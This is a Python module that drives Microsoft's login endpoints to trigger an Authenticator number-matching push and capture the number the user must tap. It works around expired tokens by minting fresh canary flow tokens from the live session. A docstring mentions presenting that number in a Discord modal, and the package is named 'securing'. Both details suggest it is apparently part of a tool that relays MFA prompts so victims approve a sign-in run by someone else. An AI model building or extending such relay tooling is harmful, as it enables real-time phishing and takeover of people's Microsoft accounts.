"""Microsoft Authenticator number-matching (NGC) push.

A ``RemoteNgcParams`` block in the GetCredentialType response only tells us the
account has the Authenticator app — it does not ring the phone. The push is sent
by ``GetOneTimeCode.srf`` with ``purpose=eOTT_RemoteNGC`` and
``channel=PushNotifications``, which answers with ``DisplaySignForUI``: the
number the user has to tap in the app.

Older builds passed a captured ``canaryFlowToken``/``uaid`` here. Captured
tokens expire and then the request becomes a silent no-op (no push, no number),
so this module uses the live session's own values and retries once with a fresh
login-page flow token when Microsoft wants a canary.
"""

from __future__ import annotations

import json
import logging

import httpx

from securing.utils.cookies.get_livedata import livedata

log = logging.getLogger(__name__)

GET_ONE_TIME_CODE_URL = "https://login.live.com/GetOneTimeCode.srf?id=38936"


def parse_ngc(credentials: dict) -> tuple[str, str | None] | None:
    """``(SessionIdentifier, Entropy)`` pulled out of ``Credentials``.

    ``Entropy`` is the number to tap and is *absent* for accounts that only use
    number matching. Reading it with ``[...]`` raised KeyError inside the Discord
    modal, so the user saw the "Sending code..." placeholder and then nothing at
    all — callers must handle ``None`` and fall back to a real push.
    """
    remote = (credentials or {}).get("RemoteNgcParams")
    if not isinstance(remote, dict):
        return None
    device = str(remote.get("SessionIdentifier") or "").strip()
    if not device:
        return None
    raw = remote.get("Entropy")
    entropy = str(raw).strip() if raw not in (None, "") else None
    return device, entropy or None


def _cookie_uaid(session: httpx.AsyncClient) -> str:
    try:
        return (session.cookies.get("uaid") or "").strip()
    except Exception:
        return ""


async def send_authenticator_push(
    session: httpx.AsyncClient,
    flow_token: str,
    *,
    canary: str | None = None,
    uaid: str | None = None,
) -> str | None:
    """Ring the Authenticator app; return the number to match, or None."""
    payload = {
        "login": "",
        "flowtoken": flow_token,
        "purpose": "eOTT_RemoteNGC",
        "channel": "PushNotifications",
        "SAPId": "",
        "lcid": "1033",
    }
    resolved_uaid = (uaid or _cookie_uaid(session)).strip()
    if resolved_uaid:
        payload["uaid"] = resolved_uaid
    if canary:
        payload["canaryFlowToken"] = canary

    response = await session.post(
        GET_ONE_TIME_CODE_URL,
        headers={
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/",
        },
        data=payload,
    )

    body = (response.text or "").strip()
    if not body:
        log.error("ngc_push: empty response status=%s", response.status_code)
        return None
    try:
        data = response.json()
    except json.JSONDecodeError:
        log.error(
            "ngc_push: non-JSON response status=%s snippet=%r",
            response.status_code,
            body[:300],
        )
        return None

    number = data.get("DisplaySignForUI") if isinstance(data, dict) else None
    if number in (None, ""):
        log.warning(
            "ngc_push: no DisplaySignForUI status=%s canary=%s body=%r",
            response.status_code,
            bool(canary),
            body[:300],
        )
        return None
    return str(number)


async def start_authenticator_request(
    session: httpx.AsyncClient,
    flow_token: str,
    *,
    canary: str | None = None,
) -> str | None:
    """Push with the session's own cookies, then once more with a fresh canary.

    The login page's flow token is minted per session (``livedata``) and only
    fetched when the first attempt did not produce a number, so a working push
    never costs an extra round trip.
    """
    number = await send_authenticator_push(session, flow_token, canary=canary)
    if number or canary:
        return number

    try:
        fresh = await livedata(session)
    except Exception:
        log.exception("ngc_push: could not mint a fresh canary flow token")
        return None

    token = (fresh or {}).get("ppft")
    if not token:
        log.error("ngc_push: fresh canary missing from livedata")
        return None

    log.info("ngc_push: retrying with a fresh canary flow token")
    return await send_authenticator_push(session, flow_token, canary=token)
